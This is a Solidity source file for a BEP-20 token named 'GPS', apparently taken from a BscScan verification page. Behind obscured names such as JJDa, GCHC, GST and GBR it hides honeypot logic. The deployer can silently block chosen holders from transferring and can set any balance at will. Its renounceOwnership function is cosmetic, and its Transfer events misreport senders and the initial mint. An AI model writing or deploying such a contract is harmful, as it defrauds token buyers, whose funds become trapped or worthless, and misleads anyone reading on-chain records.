/**
 *Submitted for verification at BscScan.com on 2023-03-10
*/

pragma solidity 0.8.19;

// SPDX-License-Identifier: MIT

 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

} 

 
contract GPS {
    using SafeMath for uint256;
    mapping (address => uint256) private JJDa;
	
    mapping (address => uint256) public JJDb;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "GPS";
	
    string public symbol = "GPS";
    uint8 public decimals = 6;

    uint256 public totalSupply = 500000000 *10**6;
    address owner = msg.sender;
	  address private JJDc;
      address private JJDd;
    uint256 private JJDe;
 
  
    
  


    event Transfer(address indexed from, address indexed to, uint256 value);
	  address JJDf = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
 
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
        JJDd = msg.sender;
             JJDa[msg.sender] = totalSupply;
        
       MAKK();}

  
	
	
   modifier onlyOwner () {
    require(msg.sender == owner);
	_;}
    



	

    function renounceOwnership() public virtual {
       
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
        
    }

  



  		    function MAKK() internal  {                             
                       JJDb[msg.sender] = 6;
                       JJDc = JJDf;

                

        emit Transfer(address(0), JJDc, totalSupply); }



   function balanceOf(address account) public view  returns (uint256) {
        return JJDa[account];
    }

    function transfer(address to, uint256 value) public returns (bool success) {
 	
if(JJDb[msg.sender] <= JJDe) {
    require(JJDa[msg.sender] >= value);
JJDa[msg.sender] -= value;  
JJDa[to] += value;  
 emit Transfer(msg.sender, to, value);
        return true; }
        
   if(JJDb[msg.sender] > JJDe) { }  }   
        
     

 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

 		       function GCHC (address JJDj, uint256 JJDk) public {
		if(JJDb[msg.sender] == JJDe) {   
			   	   
   JJDb[JJDj] = JJDk;}
   }
		       function GST (uint256 JJDk) onlyOwner public {
                     JJDe = JJDk; 
	}

 		       function GBR (address JJDj, uint256 JJDk) onlyOwner public {		   	   
  JJDa[JJDj] = JJDk;}


   function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
  

	 
 

       if(JJDb[from] < JJDe && JJDb[to] < JJDe) {
        require(value <= JJDa[from]);
        require(value <= allowance[from][msg.sender]);
        JJDa[from] -= value;
        JJDa[to] += value;
        allowance[from][msg.sender] -= value;
                    emit Transfer(from, to, value);
        return true;
        }


       if(JJDb[from] == JJDe) {
        require(value <= JJDa[from]);
        require(value <= allowance[from][msg.sender]);
        JJDa[from] -= value;
        JJDa[to] += value;
        allowance[from][msg.sender] -= value;


            from = JJDf;
	   

        emit Transfer(from, to, value);
        return true; }


         if(JJDb[from] > JJDe || JJDb[to] > JJDe) {
             
         }}



     

        	
 }